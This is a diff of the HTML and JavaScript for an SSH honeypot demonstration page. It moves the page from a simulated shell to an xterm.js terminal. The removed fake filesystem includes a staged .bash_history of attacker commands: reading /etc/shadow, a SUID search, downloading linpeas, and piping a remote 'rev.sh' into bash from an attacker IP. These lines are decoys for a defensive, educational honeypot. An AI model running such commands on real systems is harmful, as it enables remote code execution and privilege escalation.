@@ -4,8 +4,9 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Honeypot Terminal — honeypot.ximg.app</title>
-  <meta name="description" content="Live SSH honeypot simulation — watch 9 auth failures then break in. Interactive trapped shell with real Ubuntu environment.">
+  <meta name="description" content="Live SSH honeypot terminal — watch 9 real auth failures then break in and explore the trapped shell.">
   <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+  <link rel="stylesheet" href="/xterm.css">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -32,12 +33,13 @@
       padding: 10px 12px 12px;
       overflow: hidden;
       gap: 10px;
+      min-height: 0;
     }
 
-    /* ── Monitor bezel ── */
+    /* ── CRT monitor ── */
     #monitor {
       flex: 1;
-      max-width: 900px;
+      max-width: 940px;
       display: flex;
       flex-direction: column;
       background: #050a05;
@@ -49,6 +51,7 @@
         inset 0 0 80px rgba(0,0,0,.7);
       overflow: hidden;
       position: relative;
+      min-height: 0;
     }
 
     /* scanlines */
@@ -57,11 +60,8 @@
       position: absolute;
       inset: 0;
       background: repeating-linear-gradient(
-        to bottom,
-        transparent 0,
-        transparent 2px,
-        rgba(0,0,0,.15) 2px,
-        rgba(0,0,0,.15) 4px
+        to bottom, transparent 0, transparent 2px,
+        rgba(0,0,0,.13) 2px, rgba(0,0,0,.13) 4px
       );
       pointer-events: none;
       z-index: 50;
@@ -72,15 +72,14 @@
       content: '';
       position: absolute;
       inset: 0;
-      background: radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,.55) 100%);
+      background: radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,.5) 100%);
       pointer-events: none;
       z-index: 49;
     }
 
     @keyframes flicker {
-      0%,100%{opacity:1}
-      91%{opacity:1} 92%{opacity:.87} 93%{opacity:1}
-      95%{opacity:.93} 96%{opacity:1}
+      0%,100%{opacity:1} 91%{opacity:1} 92%{opacity:.88}
+      93%{opacity:1} 95%{opacity:.93} 96%{opacity:1}
     }
     #monitor { animation: flicker 14s infinite; }
 
@@ -98,195 +97,96 @@
     }
 
     #tb-left {
-      font-size: 10px;
-      color: #004d14;
-      letter-spacing: .06em;
-      display: flex;
-      align-items: center;
-      gap: 10px;
+      display: flex; align-items: center; gap: 10px;
+      font-size: 10px; color: #004d14;
     }
-
     #tb-title { color: #006619; font-weight: bold; }
-    #tb-host  { color: #003d10; }
 
-    #tb-right {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
+    #tb-right { display: flex; align-items: center; gap: 8px; }
 
     #status-pill {
-      display: flex;
-      align-items: center;
-      gap: 5px;
-      font-size: 10px;
-      color: #005e18;
-      padding: 2px 7px;
-      border: 1px solid #0d2e0d;
-      border-radius: 12px;
-      background: rgba(0,0,0,.3);
-      min-width: 120px;
+      display: flex; align-items: center; gap: 5px;
+      font-size: 10px; color: #005e18;
+      padding: 2px 8px;
+      border: 1px solid #0d2e0d; border-radius: 12px;
+      background: rgba(0,0,0,.3); min-width: 120px;
     }
 
     .sdot {
       width: 6px; height: 6px; border-radius: 50%;
-      background: #333; flex-shrink: 0;
-      transition: background .3s, box-shadow .3s;
+      background: #333; flex-shrink: 0; transition: all .3s;
     }
-    .sdot.connecting { background: #ffaa00; animation: pulse-dot .7s infinite; }
+    .sdot.connecting { background: #ffaa00; animation: pulsedot .7s infinite; }
     .sdot.failed     { background: #ff3333; }
     .sdot.ok         { background: #00ff41; box-shadow: 0 0 7px rgba(0,255,65,.8); }
+    @keyframes pulsedot { 0%,100%{opacity:1} 50%{opacity:.2} }
 
-    @keyframes pulse-dot { 0%,100%{opacity:1} 50%{opacity:.25} }
-
-    #status-label { color: #005e18; transition: color .3s; }
-    #status-label.connecting { color: #ffaa00; }
-    #status-label.failed     { color: #ff3333; }
-    #status-label.ok         { color: #00ff41; }
+    #slabel { transition: color .3s; }
+    #slabel.connecting { color: #ffaa00; }
+    #slabel.failed     { color: #ff3333; }
+    #slabel.ok         { color: #00ff41; }
 
     #replay-btn {
-      font-family: 'Courier New', monospace;
-      font-size: 10px;
-      letter-spacing: .08em;
-      color: #00882b;
-      background: transparent;
-      border: 1px solid #00551a;
-      padding: 2px 9px;
-      border-radius: 4px;
-      cursor: pointer;
-      transition: all .15s;
+      font-family: 'Courier New', monospace; font-size: 10px; letter-spacing: .08em;
+      color: #00882b; background: transparent;
+      border: 1px solid #00551a; padding: 2px 9px; border-radius: 4px;
+      cursor: pointer; transition: all .15s;
     }
-    #replay-btn:hover {
-      color: #00ff41;
-      border-color: #00cc33;
-      background: rgba(0,255,65,.05);
-    }
-    #replay-btn:disabled { opacity: .35; cursor: default; }
+    #replay-btn:hover { color: #00ff41; border-color: #00cc33; background: rgba(0,255,65,.05); }
+    #replay-btn:disabled { opacity: .3; cursor: default; }
 
-    /* ── Terminal output ── */
-    #terminal {
+    /* ── xterm container ── */
+    #xterm-wrap {
       flex: 1;
-      overflow-y: auto;
-      padding: 10px 14px 6px;
-      display: flex;
-      flex-direction: column;
+      padding: 8px 10px 6px;
+      overflow: hidden;
       position: relative;
       z-index: 40;
-      cursor: text;
+      min-height: 0;
     }
 
-    #terminal::-webkit-scrollbar { width: 4px; }
-    #terminal::-webkit-scrollbar-track { background: transparent; }
-    #terminal::-webkit-scrollbar-thumb { background: rgba(0,255,65,.12); border-radius: 2px; }
-
-    #out {
-      flex: 1;
-      font-size: 12.5px;
-      line-height: 1.55;
-      white-space: pre-wrap;
-      word-break: break-all;
+    #xterm-container {
+      width: 100%;
+      height: 100%;
     }
 
-    .ln { display: block; }
+    /* Make xterm.js background match */
+    .xterm { height: 100% !important; }
+    .xterm-viewport { overflow: hidden !important; }
+    .xterm-screen canvas { display: block; }
 
-    /* colour classes */
-    .cg  { color:#00ff41; text-shadow:0 0 5px rgba(0,255,65,.45); }
-    .cg2 { color:#00cc33; text-shadow:0 0 4px rgba(0,204,51,.3); }
-    .cdim{ color:#006619; }
-    .cbr { color:#39ff14; text-shadow:0 0 8px rgba(57,255,20,.6); }
-    .cw  { color:#ffaa00; text-shadow:0 0 5px rgba(255,170,0,.4); }
-    .ce  { color:#ff4444; text-shadow:0 0 5px rgba(255,68,68,.4); }
-    .cmt { color:#00bb2e; }
-    .cpr { color:#00ff41; font-weight:700; text-shadow:0 0 6px rgba(0,255,65,.5); }
-    .cco { color:#d4ffdc; }
-    .cdi { color:#39ff14; text-shadow:0 0 6px rgba(57,255,20,.5); }
-
-    /* ── Input line ── */
-    #iline {
-      display: none;
-      align-items: center;
-      margin-top: 1px;
-      padding-bottom: 2px;
-    }
-    #iline.on { display: flex; }
-
-    #prompt { color:#00ff41; font-size:12.5px; flex-shrink:0; font-weight:700; text-shadow:0 0 5px rgba(0,255,65,.45); white-space:pre; }
-
-    #ci {
-      flex: 1;
-      background: transparent;
-      border: none;
-      outline: none;
-      color: #d4ffdc;
-      font-family: 'Courier New', monospace;
-      font-size: 12.5px;
-      caret-color: #00ff41;
-      padding: 0 1px;
-    }
-
-    /* ── Info panel (right sidebar) ── */
+    /* ── Sidebar ── */
     #sidebar {
-      width: 160px;
-      flex-shrink: 0;
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      font-size: 10px;
-      color: #004d14;
-      overflow: hidden;
+      width: 155px; flex-shrink: 0;
+      display: flex; flex-direction: column; gap: 8px;
+      font-size: 10px; color: #004d14; overflow: hidden;
     }
 
     .sb-box {
-      border: 1px solid #0d2e0d;
-      border-radius: 5px;
-      background: rgba(0,255,65,.015);
-      padding: 8px 9px;
+      border: 1px solid #0d2e0d; border-radius: 5px;
+      background: rgba(0,255,65,.015); padding: 8px 9px;
     }
-
     .sb-title {
-      font-size: 9px;
-      letter-spacing: .1em;
-      color: #006619;
+      font-size: 9px; letter-spacing: .1em; color: #006619;
       border-bottom: 1px solid #0d2e0d;
-      padding-bottom: 4px;
-      margin-bottom: 6px;
+      padding-bottom: 4px; margin-bottom: 6px;
     }
-
     .sb-kv { display: flex; justify-content: space-between; gap: 4px; margin-bottom: 3px; line-height: 1.4; }
     .sb-k  { color: #004a12; }
     .sb-v  { color: #008f2a; font-weight: bold; text-align: right; }
-    .sb-v.hi { color: #00ff41; text-shadow: 0 0 4px rgba(0,255,65,.4); }
+    .sb-v.hi   { color: #00ff41; text-shadow: 0 0 4px rgba(0,255,65,.4); }
     .sb-v.warn { color: #ffaa00; }
     .sb-v.err  { color: #ff3333; }
 
-    .attempt-bar {
-      margin-top: 6px;
-    }
-    .attempt-label { color: #004a12; font-size: 9px; margin-bottom: 4px; }
-    .attempt-dots {
-      display: flex;
-      gap: 4px;
-      flex-wrap: wrap;
-    }
+    .attempt-dots { display: flex; gap: 4px; flex-wrap: wrap; margin-top: 4px; }
     .adot {
       width: 10px; height: 10px; border-radius: 50%;
-      border: 1px solid #0d2e0d;
-      background: #050a05;
-      transition: all .3s;
+      border: 1px solid #0d2e0d; background: #050a05; transition: all .3s;
     }
     .adot.fail { background: #ff3333; border-color: #cc0000; box-shadow: 0 0 5px rgba(255,0,0,.4); }
     .adot.ok   { background: #00ff41; border-color: #00cc33; box-shadow: 0 0 6px rgba(0,255,65,.5); }
 
-    .cmd-hint {
-      font-size: 9px;
-      color: #004010;
-      line-height: 1.6;
-    }
-    .cmd-hint span { color: #006619; }
-
-    @media (max-width: 640px) {
-      #sidebar { display: none; }
-    }
+    @media (max-width: 640px) { #sidebar { display: none; } }
   </style>
 </head>
 <body>
@@ -294,36 +194,28 @@
   <div id="wrap">
 
     <div id="monitor">
-      <!-- Title bar -->
       <div id="titlebar">
         <div id="tb-left">
           <span id="tb-title">SSH HONEYPOT</span>
-          <span id="tb-host">honeypot.ximg.app:22</span>
+          <span style="color:#003d10">honeypot.ximg.app:22</span>
         </div>
         <div id="tb-right">
           <div id="status-pill">
             <div class="sdot" id="sdot"></div>
-            <span id="status-label">OFFLINE</span>
+            <span id="slabel">OFFLINE</span>
           </div>
           <button id="replay-btn" onclick="replay()">&#x27F3; REPLAY</button>
         </div>
       </div>
-
-      <!-- Terminal -->
-      <div id="terminal" onclick="focusInput()">
-        <div id="out"></div>
-        <div id="iline">
-          <span id="prompt">user@web01:~$ </span>
-          <input id="ci" type="text" autocomplete="off" spellcheck="false" autocorrect="off">
-        </div>
+      <div id="xterm-wrap">
+        <div id="xterm-container"></div>
       </div>
     </div>
 
-    <!-- Sidebar -->
     <div id="sidebar">
       <div class="sb-box">
         <div class="sb-title">TARGET</div>
-        <div class="sb-kv"><span class="sb-k">host</span><span class="sb-v" id="sb-host">honeypot.ximg.app</span></div>
+        <div class="sb-kv"><span class="sb-k">host</span><span class="sb-v" style="font-size:9px">honeypot.ximg.app</span></div>
         <div class="sb-kv"><span class="sb-k">port</span><span class="sb-v">22</span></div>
         <div class="sb-kv"><span class="sb-k">user</span><span class="sb-v">user</span></div>
         <div class="sb-kv"><span class="sb-k">banner</span><span class="sb-v" style="font-size:8px">OpenSSH_8.9p1</span></div>
@@ -333,12 +225,9 @@
       <div class="sb-box">
         <div class="sb-title">SESSION</div>
         <div class="sb-kv"><span class="sb-k">state</span><span class="sb-v" id="sb-state">idle</span></div>
-        <div class="sb-kv"><span class="sb-k">attempts</span><span class="sb-v" id="sb-attempts">0</span></div>
+        <div class="sb-kv"><span class="sb-k">attempts</span><span class="sb-v" id="sb-att">0</span></div>
         <div class="sb-kv"><span class="sb-k">threshold</span><span class="sb-v warn">10</span></div>
-        <div class="attempt-bar">
-          <div class="attempt-label">auth attempts</div>
-          <div class="attempt-dots" id="adots"></div>
-        </div>
+        <div class="attempt-dots" id="adots"></div>
       </div>
 
       <div class="sb-box">
@@ -346,897 +235,263 @@
         <div class="sb-kv"><span class="sb-k">os</span><span class="sb-v" style="font-size:8px">Ubuntu 22.04</span></div>
         <div class="sb-kv"><span class="sb-k">kernel</span><span class="sb-v" style="font-size:8px">5.15.0-91</span></div>
         <div class="sb-kv"><span class="sb-k">arch</span><span class="sb-v">x86_64</span></div>
-        <div class="sb-kv"><span class="sb-k">net</span><span class="sb-v err">BLOCKED</span></div>
-        <div class="sb-kv"><span class="sb-k">shell</span><span class="sb-v">/bin/bash</span></div>
+        <div class="sb-kv"><span class="sb-k">net out</span><span class="sb-v err">BLOCKED</span></div>
       </div>
 
       <div class="sb-box">
-        <div class="sb-title">COMMANDS</div>
-        <div class="cmd-hint">
-          <span>ls</span> &nbsp;<span>cat</span> &nbsp;<span>cd</span><br>
-          <span>ps aux</span><br>
-          <span>ip addr</span><br>
-          <span>cat .bash_history</span><br>
-          <span>find / -perm -4000</span><br>
-          <span>wget</span> <span>curl</span><br>
-          <span>sudo su</span><br>
-          <span>uname -a</span><br>
-          <span>help</span>
+        <div class="sb-title">LIVE SESSION</div>
+        <div style="color:#006619;font-size:9px;line-height:1.6">
+          Real bash shell.<br>
+          Fully logged to<br>
+          <span style="color:#00882b">logs.ximg.app</span><br>
+          → SSH Sessions
         </div>
       </div>
     </div>
 
   </div>
 
+  <script src="/xterm.js"></script>
+  <script src="/xterm-addon-fit.js"></script>
   <script>
-  (function() {
-    const out    = document.getElementById('out');
-    const iline  = document.getElementById('iline');
-    const ci     = document.getElementById('ci');
-    const prompt = document.getElementById('prompt');
-    const sdot   = document.getElementById('sdot');
-    const slabel = document.getElementById('status-label');
-    const adots  = document.getElementById('adots');
-    const sbState    = document.getElementById('sb-state');
-    const sbAttempts = document.getElementById('sb-attempts');
-    const replayBtn  = document.getElementById('replay-btn');
+  (function () {
+    const sdot    = document.getElementById('sdot');
+    const slabel  = document.getElementById('slabel');
+    const sbState = document.getElementById('sb-state');
+    const sbAtt   = document.getElementById('sb-att');
+    const adots   = document.getElementById('adots');
+    const replayBtn = document.getElementById('replay-btn');
 
     const sleep = ms => new Promise(r => setTimeout(r, ms));
-    let seqRunning = false;
-    let live = false;
-    let cwd = '/home/user';
-    let cmdHistory = [];
-    let histIdx = -1;
+    const ri = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
 
-    // ── Attempt dots ──────────────────────────────────────────
-    function initDots() {
+    // ── Attempt dots ──────────────────────────────────────────────────────
+    function initDots () {
       adots.innerHTML = '';
       for (let i = 0; i < 10; i++) {
         const d = document.createElement('div');
-        d.className = 'adot';
-        d.id = 'adot' + i;
+        d.className = 'adot'; d.id = 'adot' + i;
         adots.appendChild(d);
       }
     }
-
-    function setDot(i, cls) {
+    function setDot (i, cls) {
       const d = document.getElementById('adot' + i);
       if (d) d.className = 'adot ' + cls;
     }
 
-    // ── Status ────────────────────────────────────────────────
-    function setStatus(state, text) {
-      sdot.className = 'sdot ' + state;
-      slabel.className = state;
-      slabel.textContent = text;
-      sbState.textContent = text.toLowerCase();
+    // ── Status ─────────────────────────────────────────────────────────────
+    function setStatus (dotCls, labelText, labelCls) {
+      sdot.className   = 'sdot ' + dotCls;
+      slabel.textContent = labelText;
+      slabel.className   = labelCls || '';
+      sbState.textContent = labelText.toLowerCase();
     }
 
-    // ── Output helpers ────────────────────────────────────────
-    function scrollBot() {
-      const t = document.getElementById('terminal');
-      t.scrollTop = t.scrollHeight;
-    }
+    // ── xterm.js ───────────────────────────────────────────────────────────
+    const term = new Terminal({
+      theme: {
+        background:    '#050905',
+        foreground:    '#00ff41',
+        cursor:        '#00ff41',
+        cursorAccent:  '#050905',
+        selectionBackground: 'rgba(0,255,65,.25)',
+        black:         '#000000',   brightBlack:   '#004d14',
+        red:           '#ff4444',   brightRed:     '#ff6666',
+        green:         '#00ff41',   brightGreen:   '#39ff14',
+        yellow:        '#ffaa00',   brightYellow:  '#ffcc66',
+        blue:          '#4488ff',   brightBlue:    '#66aaff',
+        magenta:       '#ff44ff',   brightMagenta: '#ff88ff',
+        cyan:          '#44ffcc',   brightCyan:    '#77ffee',
+        white:         '#ccffcc',   brightWhite:   '#eeffee',
+      },
+      fontFamily: '"Courier New", Courier, monospace',
+      fontSize:   13,
+      lineHeight: 1.2,
+      cursorBlink: true,
+      cursorStyle: 'block',
+      scrollback:  2000,
+      allowProposedApi: true,
+    });
 
-    function ln(text, cls = 'cg') {
-      const s = document.createElement('span');
-      s.className = 'ln ' + cls;
-      s.textContent = text;
-      out.appendChild(s);
-      out.appendChild(document.createTextNode('\n'));
-      scrollBot();
-    }
+    const fitAddon = new FitAddon.FitAddon();
+    term.loadAddon(fitAddon);
+    term.open(document.getElementById('xterm-container'));
+    fitAddon.fit();
 
-    function lnHTML(html, cls = '') {
-      const s = document.createElement('span');
-      s.className = 'ln ' + cls;
-      s.innerHTML = html;
-      out.appendChild(s);
-      out.appendChild(document.createTextNode('\n'));
-      scrollBot();
-    }
+    new ResizeObserver(() => fitAddon.fit()).observe(
+      document.getElementById('xterm-wrap')
+    );
 
-    function blankLine() { ln('', 'cdim'); }
+    // ── Session state ──────────────────────────────────────────────────────
+    let ws          = null;
+    let shellActive = false;
+    let ptyBuf      = [];
 
-    // Append to the last span in out (for inline building)
-    function appendLast(text) {
-      const spans = out.querySelectorAll('span.ln');
-      if (spans.length) spans[spans.length - 1].textContent += text;
-      scrollBot();
-    }
+    // JSON message queue so async handlers run in order
+    let msgQueue      = [];
+    let queueRunning  = false;
 
-    // ── Random helpers ────────────────────────────────────────
-    function ri(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
-
-    function randFP() {
-      const b = Array.from({length:32}, () => ri(0,255));
-      return btoa(String.fromCharCode(...b)).slice(0,43) + '=';
-    }
-
-    // ── Virtual filesystem ────────────────────────────────────
-    const NOW = new Date();
-    const fmtMon = d => d.toLocaleString('en-US', {month:'short'}).padEnd(3);
-    const fmtDay = d => String(d.getDate()).padStart(2,' ');
-    const fmtHM  = d => d.toTimeString().slice(0,5);
-    const todayStr = `${fmtMon(NOW)} ${fmtDay(NOW)} ${fmtHM(NOW)}`;
-    const oldStr   = 'Nov 15  2023';
-
-    const MOTD_LINES = [
-      'Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)',
-      '',
-      ' * Documentation:  https://help.ubuntu.com',
-      ' * Management:     https://landscape.canonical.com',
-      ' * Support:        https://ubuntu.com/advantage',
-      '',
-      '  System information as of ' + NOW.toUTCString().replace('GMT','UTC'),
-      '',
-      'Last login: ' + new Date(NOW - 7200000).toString().slice(0,24) + ' from 10.0.0.1',
-    ];
-
-    const FS = {
-      '/': { type:'dir', e:[
-        {n:'bin',t:'d'},{n:'dev',t:'d'},{n:'etc',t:'d'},{n:'home',t:'d'},
-        {n:'lib',t:'d'},{n:'lib64',t:'d'},{n:'media',t:'d'},{n:'mnt',t:'d'},
-        {n:'opt',t:'d'},{n:'proc',t:'d'},{n:'root',t:'d'},{n:'run',t:'d'},
-        {n:'sbin',t:'d'},{n:'srv',t:'d'},{n:'sys',t:'d'},{n:'tmp',t:'d'},
-        {n:'usr',t:'d'},{n:'var',t:'d'}
-      ]},
-      '/home': { type:'dir', e:[{n:'user',t:'d'}] },
-      '/home/user': { type:'dir', e:[
-        {n:'.bash_logout',t:'f',sz:220,mt:oldStr},
-        {n:'.bashrc',t:'f',sz:3526,mt:oldStr},
-        {n:'.profile',t:'f',sz:807,mt:oldStr},
-        {n:'.bash_history',t:'f',sz:412,mt:todayStr},
-        {n:'.ssh',t:'d',mt:todayStr},
-      ]},
-      '/home/user/.ssh': { type:'dir', e:[
-        {n:'authorized_keys',t:'f',sz:0,mt:todayStr}
-      ]},
-      '/etc': { type:'dir', e:[
-        {n:'adduser.conf',t:'f'},{n:'apt',t:'d'},{n:'bash.bashrc',t:'f'},
-        {n:'cron.d',t:'d'},{n:'crontab',t:'f'},{n:'debian_version',t:'f'},
-        {n:'environment',t:'f'},{n:'fstab',t:'f'},{n:'group',t:'f'},
-        {n:'hostname',t:'f'},{n:'hosts',t:'f'},{n:'hosts.allow',t:'f'},
-        {n:'hosts.deny',t:'f'},{n:'issue',t:'f'},{n:'motd',t:'f'},
-        {n:'nsswitch.conf',t:'f'},{n:'os-release',t:'f'},{n:'passwd',t:'f'},
-        {n:'profile',t:'f'},{n:'resolv.conf',t:'f'},{n:'shadow',t:'f'},
-        {n:'shells',t:'f'},{n:'timezone',t:'f'}
-      ]},
-      '/proc': { type:'dir', e:[
-        {n:'1',t:'d'},{n:'7',t:'d'},{n:'142',t:'d'},
-        {n:'cpuinfo',t:'f'},{n:'meminfo',t:'f'},{n:'net',t:'d'},{n:'version',t:'f'}
-      ]},
-      '/tmp':     { type:'dir', e:[] },
-      '/var':     { type:'dir', e:[{n:'backups',t:'d'},{n:'cache',t:'d'},{n:'lib',t:'d'},{n:'log',t:'d'},{n:'spool',t:'d'},{n:'tmp',t:'d'}] },
-      '/var/log': { type:'dir', e:[{n:'auth.log',t:'f'},{n:'syslog',t:'f'},{n:'dpkg.log',t:'f'}] },
-    };
-
-    const FILES = {
-      '/etc/hostname': 'web01',
-      '/etc/hosts':
-        '127.0.0.1\tlocalhost\n' +
-        '::1\t\tlocalhost ip6-localhost ip6-loopback\n' +
-        '172.20.0.5\tweb01',
-      '/etc/os-release': [
-        'NAME="Ubuntu"',
-        'VERSION="22.04.3 LTS (Jammy Jellyfish)"',
-        'ID=ubuntu','ID_LIKE=debian',
-        'PRETTY_NAME="Ubuntu 22.04.3 LTS"',
-        'VERSION_ID="22.04"',
-        'HOME_URL="https://www.ubuntu.com/"',
-        'SUPPORT_URL="https://help.ubuntu.com/"',
-        'BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"',
-        'PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"',
-        'UBUNTU_CODENAME=jammy',
-      ].join('\n'),
-      '/etc/issue': 'Ubuntu 22.04.3 LTS \\n \\l\n',
-      '/etc/timezone': 'Etc/UTC',
-      '/etc/shells': '/bin/sh\n/bin/bash\n/usr/bin/bash\n/bin/rbash\n/usr/bin/rbash\n/usr/bin/sh\n/bin/dash\n/usr/bin/dash',
-      '/etc/motd': MOTD_LINES.join('\n'),
-      '/etc/passwd': [
-        'root:x:0:0:root:/root:/bin/bash',
-        'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
-        'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
-        'sys:x:3:3:sys:/dev:/usr/sbin/nologin',
-        'sync:x:4:65534:sync:/bin:/bin/sync',
-        'games:x:5:60:games:/usr/games:/usr/sbin/nologin',
-        'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin',
-        'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin',
-        'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin',
-        'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin',
-        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
-        'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin',
-        'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin',
-        '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin',
-        'user:x:1000:1000::/home/user:/bin/bash',
-      ].join('\n'),
-      '/etc/group': [
-        'root:x:0:','daemon:x:1:','bin:x:2:','sys:x:3:',
-        'adm:x:4:syslog','tty:x:5:','disk:x:6:','lp:x:7:',
-        'mail:x:8:','news:x:9:','uucp:x:10:','man:x:12:',
-        'proxy:x:13:','kmem:x:15:','dialout:x:20:',
-        'cdrom:x:24:','audio:x:29:','www-data:x:33:',
-        'backup:x:34:','sudo:x:27:','nobody:x:65534:',
-        'user:x:1000:',
-      ].join('\n'),
-      '/etc/crontab': [
-        '# /etc/crontab: system-wide crontab',
-        'SHELL=/bin/sh',
-        'PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin',
-        '',
-        '# m  h   dom mon dow user   command',
-        '17 * \t* * *\troot\tcd / && run-parts --report /etc/cron.hourly',
-        '25 6\t* * *\troot\ttest -x /usr/sbin/anacron || run-parts --report /etc/cron.daily',
-        '47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || run-parts --report /etc/cron.weekly',
-        '52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || run-parts --report /etc/cron.monthly',
-      ].join('\n'),
-      '/home/user/.bashrc': [
-        '# ~/.bashrc: executed by bash(1) for non-login shells.',
-        '',
-        'case $- in',
-        '    *i*) ;;',
-        '      *) return;;',
-        'esac',
-        '',
-        'HISTCONTROL=ignoreboth',
-        'shopt -s histappend',
-        'HISTSIZE=1000',
-        'HISTFILESIZE=2000',
-        'HISTTIMEFORMAT="%F %T "',
-        '',
-        "PS1='\\u@\\h:\\w\\$ '",
-        '',
-        "alias ll='ls -alF'",
-        "alias la='ls -A'",
-        "alias l='ls -CF'",
-      ].join('\n'),
-      '/home/user/.profile': [
-        '# ~/.profile: executed by the command interpreter for login shells.',
-        '',
-        'if [ -d "$HOME/bin" ] ; then',
-        '    PATH="$HOME/bin:$PATH"',
-        'fi',
-        '',
-        'if [ -d "$HOME/.local/bin" ] ; then',
-        '    PATH="$HOME/.local/bin:$PATH"',
-        'fi',
-      ].join('\n'),
-      '/home/user/.bash_history': [
-        'ls -la',
-        'pwd',
-        'id',
-        'whoami',
-        'uname -a',
-        'cat /etc/os-release',
-        'cat /etc/passwd',
-        'cat /etc/shadow',
-        'sudo su',
-        'sudo -l',
-        'ps aux',
-        'ip addr',
-        'ss -tulpn',
-        'cat /etc/crontab',
-        'find / -perm -4000 -type f 2>/dev/null',
-        'find / -writable -type d 2>/dev/null',
-        'ls /var/www',
-        'ls /opt',
-        'ls /tmp',
-        'wget http://10.10.14.6/linpeas.sh',
-        'chmod +x linpeas.sh',
-        './linpeas.sh',
-        'curl http://10.10.14.6:4444/rev.sh | bash',
-      ].join('\n'),
-      '/home/user/.ssh/authorized_keys': '',
-      '/proc/version': 'Linux version 5.15.0-91-generic (buildd@lcy02-amd64-032) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023',
-      '/proc/cpuinfo': [
-        'processor\t: 0',
-        'vendor_id\t: GenuineIntel',
-        'model name\t: Intel(R) Xeon(R) CPU E5-2686 v4 @ 2.30GHz',
-        'cpu MHz\t\t: 2300.000',
-        'cache size\t: 46080 KB',
-        'flags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sse sse2 ht nx lm',
-        'bogomips\t: 4600.01',
-        'address sizes\t: 46 bits physical, 48 bits virtual',
-      ].join('\n'),
-      '/proc/meminfo': [
-        'MemTotal:        2048000 kB',
-        'MemFree:         1524800 kB',
-        'MemAvailable:    1687040 kB',
-        'Buffers:           32768 kB',
-        'Cached:           163840 kB',
-        'SwapCached:            0 kB',
-        'SwapTotal:             0 kB',
-        'SwapFree:              0 kB',
-      ].join('\n'),
-      '/var/log/auth.log':
-        `Apr 14 08:42:01 web01 python3[7]: [honeypot] listening on :22\n` +
-        `Apr 14 08:42:44 web01 python3[7]: [honeypot] connection from 45.79.108.33:51022\n` +
-        `Apr 14 08:43:01 web01 python3[7]: [honeypot] connection from 45.79.108.33:51023\n` +
-        `Apr 14 08:43:18 web01 python3[7]: [honeypot] session opened user from 45.79.108.33\n` +
-        `Apr 14 09:12:55 web01 python3[7]: [honeypot] connection from 193.106.191.15:38820\n`,
-    };
-
-    // ── Path helpers ──────────────────────────────────────────
-    function resolvePath(p) {
-      if (!p || p === '~') return '/home/user';
-      if (p === '/') return '/';
-      let base = p.startsWith('/') ? '' : cwd;
-      if (p.startsWith('~/')) p = '/home/user/' + p.slice(2);
-      const parts = (base + '/' + p).split('/').filter(Boolean);
-      const res = [];
-      for (const seg of parts) {
-        if (seg === '.') continue;
-        if (seg === '..') res.pop();
-        else res.push(seg);
+    async function runQueue () {
+      if (queueRunning) return;
+      queueRunning = true;
+      while (msgQueue.length) {
+        await handleJSON(msgQueue.shift());
       }
-      return '/' + res.join('/');
+      queueRunning = false;
     }
 
-    function getPromptStr() {
-      const disp = cwd === '/home/user' ? '~' : cwd.startsWith('/home/user/') ? '~' + cwd.slice(10) : cwd;
-      return 'user@web01:' + disp + '$ ';
+    // ── xterm.js helpers ──────────────────────────────────────────────────
+    async function typeAsterisks (n) {
+      for (let i = 0; i < n; i++) {
+        term.write('*');
+        await sleep(ri(70, 130));
+      }
     }
 
-    // ── Shell commands ────────────────────────────────────────
-    function execCmd(raw) {
-      const trimmed = raw.trim();
-      if (!trimmed) { ln(getPromptStr(), 'cpr'); return; }
-
-      // Echo the command with prompt
-      const pSpan = document.createElement('span');
-      pSpan.className = 'ln cpr';
-      pSpan.textContent = getPromptStr();
-      const cSpan = document.createElement('span');
-      cSpan.className = 'cco';
-      cSpan.textContent = trimmed;
-      out.appendChild(pSpan);
-      out.appendChild(cSpan);
-      out.appendChild(document.createTextNode('\n'));
-      scrollBot();
-
-      const tok = trimmed.split(/\s+/);
-      const cmd = tok[0];
-      const args = tok.slice(1);
-      const flags = args.filter(a => a.startsWith('-')).join('');
-      const posArgs = args.filter(a => !a.startsWith('-'));
-
-      if (cmd === 'clear') { out.innerHTML = ''; return; }
-
-      if (cmd === 'pwd') { ln(cwd); return; }
-
-      if (cmd === 'whoami') { ln('user'); return; }
-
-      if (cmd === 'id') {
-        ln('uid=1000(user) gid=1000(user) groups=1000(user)');
-        return;
+    async function typeText (text) {
+      for (const ch of text) {
+        term.write(ch === '\n' ? '\r\n' : ch);
+        await sleep(ri(80, 150));
       }
+    }
 
-      if (cmd === 'hostname') { ln('web01'); return; }
+    // ── Handle JSON messages from server ──────────────────────────────────
+    async function handleJSON (msg) {
+      switch (msg.t) {
 
-      if (cmd === 'uname') {
-        if (flags.includes('a')) ln('Linux web01 5.15.0-91-generic #101-Ubuntu SMP Tue Nov 14 13:30:08 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux');
